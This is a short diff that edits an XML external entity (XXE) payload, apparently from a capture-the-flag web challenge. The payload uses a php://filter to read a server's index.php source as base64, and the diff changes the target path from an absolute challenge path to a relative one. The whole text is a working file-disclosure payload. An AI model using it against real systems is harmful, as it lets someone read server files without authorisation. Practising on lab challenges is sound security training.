@@ -2,5 +2,5 @@
 
  
  <!DOCTYPE foo [  
-   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php" >]><foo>&xxe;</foo>
+   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>
 
